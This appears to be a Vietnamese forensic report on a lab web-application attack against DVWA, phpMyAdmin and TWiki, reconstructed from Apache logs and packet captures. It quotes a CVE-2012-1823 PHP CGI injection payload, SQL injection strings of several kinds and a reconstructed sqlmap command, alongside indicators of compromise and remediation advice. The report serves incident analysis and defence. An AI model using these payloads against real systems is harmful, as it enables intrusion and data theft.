# BÁO CÁO ĐIỀU TRA TÌNH HUỐNG TẤN CÔNG WEB APPLICATION

## 1. SƠ ĐỒ TẤNG CÔNG

```
┌─────────────────────────────────────────────────────────────┐
│                    INTERNAL NETWORK                          │
│                   (No Internet Access)                       │
│                                                              │
│  ┌──────────┐         ┌──────────────┐      ┌─────────────┐│
│  │  HACKER  │────────►│CACHING PROXY │─────►│APPLICATION  ││
│  │          │         │              │      │   SERVER    ││
│  │Multiple  │  HTTP   │   (Squid/    │ HTTP │  (Apache    ││
│  │IPs Used  │ Requests│    Apache)   │Forward│  +MySQL)   ││
│  └──────────┘         └──────────────┘      └─────────────┘│
│                                                              │
│  Attack Sources:                                            │
│  - 192.168.116.146  (Nmap scan - 22/Apr/2018)              │
│  - 192.168.10.105   (Nmap scan - 14/May/2018)              │
│  - 192.168.174.150  (Main attacker - 30/Dec/2018)          │
│  - 192.168.174.157  (SQLi automated tool - 30/Dec/2018)    │
│                                                              │
│  Target: Application Server (127.0.0.1 + Proxy forward)    │
└─────────────────────────────────────────────────────────────┘
```

## 2. QUÁ TRÌNH ĐIỀU TRA CHI TIẾT

### Bước 1: Phân tích Apache Access Log (AppServer.csv)

#### 1.1. Giai đoạn Reconnaissance (Trinh sát)

**Thời gian:** 22/Apr/2018 14:45:12 và 14/May/2018 16:02:26

**Kẻ tấn công:** 
- IP: 192.168.116.146
- IP: 192.168.10.105

**Hành vi phát hiện:**
```
GET /nmaplowercheck1524422717 HTTP/1.1    (404)
POST /sdk HTTP/1.1                        (404)
GET /HNAP1 HTTP/1.1                       (404)
```

**Kết luận:** Sử dụng **Nmap** để quét dịch vụ và phát hiện lỗ hổng:
- `/sdk` - VMware vulnerability scan
- `/HNAP1` - Home Network Administration Protocol (router vulnerability)
- `/nmaplowercheck*` - Nmap fingerprinting

---

#### 1.2. Giai đoạn Enumeration (Liệt kê thông tin)

**Thời gian:** 30/Dec/2018 06:43-07:01

**Kẻ tấn công:** 
- IP: 192.168.174.150 (Người dùng thực - Manual testing)
- IP: 192.168.174.157 (Automated tool - SQLMap/Havij)

**Các endpoint bị truy cập:**
```
1. /phpMyAdmin/         - Database management (200 OK)
2. /twiki/              - Wiki application (200 OK)
3. /dvwa/               - Damn Vulnerable Web App (302/200)
4. /dav/                - WebDAV (200 OK)
5. /phpinfo.php         - PHP configuration (200 OK)
```

**Phân tích:**
- Attacker khám phá được nhiều ứng dụng web dễ tổn thương
- PHPMyAdmin login attempts (failed)
- DVWA được phát hiện và truy cập thành công
- phpinfo.php lộ thông tin cấu hình máy chủ

---

#### 1.3. Giai đoạn Exploitation - PHP CGI Argument Injection

**Thời gian:** 30/Dec/2018 07:02:35 và 07:05:36

**Attack vector:** CVE-2012-1823 (PHP CGI Argument Injection)

**Payload phát hiện:**
```http
POST /?-d+allow_url_include=1+-d+safe_mode=Off+--define+suhosin.simulation=True
  +--define+disable_functions=""+-d+open_basedir=none
  +--define+auto_prepend_file=php://input
  +--define+cgi.force_redirect=0
  +--define+cgi.redirect_status_env=0+-n HTTP/1.1
```

**Mục đích:**
- Bypass `safe_mode` và `open_basedir`
- Enable `allow_url_include` để thực thi mã từ xa
- Sử dụng `php://input` để inject PHP code
- Disable security functions

**Kết quả:** Server trả về **500 Internal Server Error** - Tấn công không thành công

---

#### 1.4. Giai đoạn SQL Injection Testing (Automated)

**Thời gian:** 30/Dec/2018 07:13:26 - 07:13:35 (9 giây!)

**Kẻ tấn công:** 192.168.174.157

**Công cụ:** SQLMap hoặc Havij (dựa trên pattern signatures)

**Số lượng request:** 200+ requests trong 9 giây!

**Các kỹ thuật SQL Injection được test:**

1. **Error-based SQLi:**
```sql
id=12' AND (SELECT 4481 FROM(SELECT COUNT(*),CONCAT(0x71786a6271,(SELECT (ELT(4481=4481,1))),0x717a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

2. **Union-based SQLi:**
```sql
id=12 UNION ALL SELECT NULL,NULL--
id=12 UNION ALL SELECT NULL,NULL,NULL--
(Testing column count: 1 đến 10 columns)
```

3. **Boolean-based Blind SQLi:**
```sql
id=12 AND 1354=1354  (True)
id=12 AND 1552=1612  (False)
```

4. **Time-based Blind SQLi:**
```sql
MySQL:  id=12 AND SLEEP(5)
MSSQL:  id=12 WAITFOR DELAY '0:0:5'
PostgreSQL: id=12 AND 7871=(SELECT 7871 FROM PG_SLEEP(5))
Oracle: id=12;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(79),5) FROM DUAL
```

5. **Stacked queries:**
```sql
id=12);SELECT PG_SLEEP(5)--
id=12';SELECT PG_SLEEP(5)--
```

**Kết quả:** Tất cả trả về **302 Redirect** - Chứng tỏ DVWA đang ở mức **Medium/High security**

---

#### 1.5. Giai đoạn Manual SQL Injection Testing

**Thời gian:** 30/Dec/2018 07:12:40 - 07:28:41

**Kẻ tấn công:** 192.168.174.150 (Human attacker)

**Hành vi:**
1. Login vào DVWA thành công (07:12:33)
```
POST /dvwa/login.php
→ GET /dvwa/index.php (200 OK)
```

2. Thay đổi security level từ **Low** sang **Medium** (07:22:25)
```
POST /dvwa/security.php
```

3. Thực hiện SQL Injection testing thủ công:
```
id=12'                  (Testing for SQL syntax error)
id=12'--+              (SQL comment)
id=-12--+              (Negative ID test)
```

4. Sử dụng automated tool (07:28:13 - 07:28:41):
```
200+ SQL injection payloads trong 28 giây
```

---

### Bước 2: Phân tích Network Traffic (Network traffic.pcap)

**File PCAP:** 360,130 bytes

**Nội dung cần phân tích với Wireshark:**

1. **TCP Streams:**
   - Filter: `tcp.stream eq X`
   - Xem toàn bộ HTTP conversations

2. **HTTP Requests:**
   - Filter: `http.request`
   - Phân tích request headers, User-Agent

3. **POST Data:**
   - Filter: `http.request.method == "POST"`
   - Xem payload của PHP CGI injection

4. **SQL Injection payloads:**
   - Filter: `http.request.uri contains "UNION" or http.request.uri contains "SELECT"`

5. **Session tracking:**
   - Filter: `http.cookie`
   - Theo dõi PHPSESSID

---

## 3. TIMELINE TỔNG HỢP

```
2018-04-22 14:45:12  │  192.168.116.146  │  Nmap scanning
2018-05-14 16:02:26  │  192.168.10.105   │  Nmap scanning
2018-12-30 06:43:45  │  192.168.174.150  │  Web enumeration bắt đầu
           06:43:54  │  192.168.174.150  │  PHPMyAdmin login attempts
           06:44:17  │  192.168.174.150  │  TWiki exploration
           06:51:24  │  192.168.174.157  │  PHPMyAdmin từ IP thứ 2
           06:58:52  │  192.168.174.157  │  DVWA login attempts (failed)
           07:01:23  │  192.168.174.157  │  phpinfo.php accessed
           07:02:35  │  192.168.174.157  │  PHP CGI injection attempt #1
           07:05:36  │  192.168.174.157  │  PHP CGI injection attempt #2
           07:12:33  │  192.168.174.150  │  DVWA login successful
           07:13:26  │  192.168.174.157  │  SQLMap automated SQLi (200+ requests)
           07:22:25  │  192.168.174.150  │  Security level changed to Medium
           07:28:13  │  192.168.174.150  │  Manual + automated SQLi testing
```

---

## 4. PHÁT HIỆN VÀ CHỈ DẪN

### 4.1. Các lỗ hổng bị khai thác

1. **Information Disclosure:**
   - `/phpinfo.php` lộ cấu hình PHP
   - Directory listing enabled (`/dav/`)

2. **Vulnerable Applications:**
   - DVWA (intentionally vulnerable)
   - PHPMyAdmin exposed
   - TWiki old version

3. **SQL Injection:**
   - DVWA SQL Injection page
   - Security level: Low → Medium

4. **PHP CGI Vulnerability (CVE-2012-1823):**
   - Attempted but failed (500 error)

### 4.2. Attack Techniques

1. **Network Scanning:** Nmap
2. **Web Enumeration:** Manual + automated
3. **SQL Injection:** SQLMap/Havij + manual testing
4. **PHP Exploitation:** CGI argument injection

### 4.3. Indicators of Compromise (IOCs)

**Attacker IPs:**
```
192.168.116.146  (Reconnaissance)
192.168.10.105   (Reconnaissance)
192.168.174.150  (Main attacker - Manual testing)
192.168.174.157  (Automated attack tools)
```

**Attack Signatures:**
```
- Nmap user-agent strings
- SQLMap/Havij specific payloads (hex encoding, CONCAT functions)
- PHP CGI injection patterns
- 200+ requests in < 10 seconds
- Union SELECT NULL patterns
- SLEEP/WAITFOR/PG_SLEEP functions
```

---

## 5. KHUYẾN NGHỊ BẢO MẬT

### 5.1. Immediate Actions

1. **Block attacker IPs** tại firewall/IPS
2. **Remove/Protect:**
   - `/phpinfo.php`
   - PHPMyAdmin (restrict by IP or remove)
   - DVWA (development only)
   - TWiki (update or remove)

3. **Enable WAF (Web Application Firewall):**
   - ModSecurity rules
   - OWASP Core Rule Set

4. **Patch PHP:**
   - Update to latest version (CVE-2012-1823 fixed in PHP 5.3.12+)

### 5.2. Long-term Solutions

1. **Input Validation:**
   - Prepared statements (PDO/MySQLi)
   - Parameterized queries
   - Whitelist input validation

2. **Security Headers:**
```apache
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "SAMEORIGIN"
Header set X-XSS-Protection "1; mode=block"
Header set Content-Security-Policy "default-src 'self'"
```

3. **Rate Limiting:**
   - Limit requests per IP (e.g., 100/minute)
   - CAPTCHA for sensitive forms

4. **Logging & Monitoring:**
   - SIEM integration
   - Real-time alerting
   - Log retention policy

5. **Network Segmentation:**
   - DMZ for web servers
   - Database in internal network
   - Proxy/WAF in front

---

## 6. CÔNG CỤ PHÂN TÍCH ĐỀ XUẤT

### 6.1. Log Analysis
- **Apache Log Viewer** (Windows) - Đã có
- **SawMill** (Windows) - Đã có
- **GoAccess** (Linux) - Real-time web log analyzer

### 6.2. Network Traffic Analysis
- **Wireshark** - Đã có
- Filters đề xuất:
```
http.request and ip.src == 192.168.174.157
http.request.uri contains "UNION"
http.request.method == "POST"
tcp.stream eq 0
```

### 6.3. Attack Pattern Detection
```bash
# Trên Kali Linux
grep -E "(UNION|SELECT|SLEEP|CONCAT)" AppServer.csv | wc -l
grep "192.168.174.157" AppServer.csv | grep -c "vulnerabilities/sqli"
```

---

## 7. KẾT LUẬN

**Tình huống:**
- Đây là một cuộc tấn công **multi-stage** từ bên trong mạng nội bộ
- Attacker đã sử dụng kỹ thuật **reconnaissance → enumeration → exploitation**
- Các công cụ tự động (Nmap, SQLMap/Havij) được kết hợp với testing thủ công

**Mức độ nguy hiểm:**
- **HIGH** - Nhiều lỗ hổng được phát hiện
- SQL Injection thành công (DVWA Low security)
- Information disclosure (phpinfo, directory listing)

**Hành động được thực hiện:**
- PHP CGI injection: **FAILED** (500 error)
- SQL Injection: **SUCCESSFUL** trong DVWA Low mode
- Authentication bypass attempts: **MIXED** (DVWA success, PHPMyAdmin failed)

---

## PHỤ LỤC

### A. SQLMap Command Reconstruction

Dựa trên log patterns, có thể tái hiện lệnh SQLMap:
```bash
sqlmap -u "http://target/dvwa/vulnerabilities/sqli/?id=12" \
  --cookie="PHPSESSID=xxxxx; security=low" \
  --technique=BEUSTQ \
  --level=5 \
  --risk=3 \
  --threads=10 \
  --batch
```

### B. DVWA Security Levels

```
Low:     No protection (vulnerable)
Medium:  Basic filtering (bypassed với advanced techniques)
High:    Strong filtering (requires manual exploitation)
```

### C. References

- CVE-2012-1823: PHP CGI Argument Injection
- OWASP Top 10: A1 - Injection
- DVWA Project: http://www.dvwa.co.uk/

---

**Người thực hiện:** Digital Forensics Investigation Team
**Ngày:** 3 December 2025
**Mức độ mật:** CONFIDENTIAL
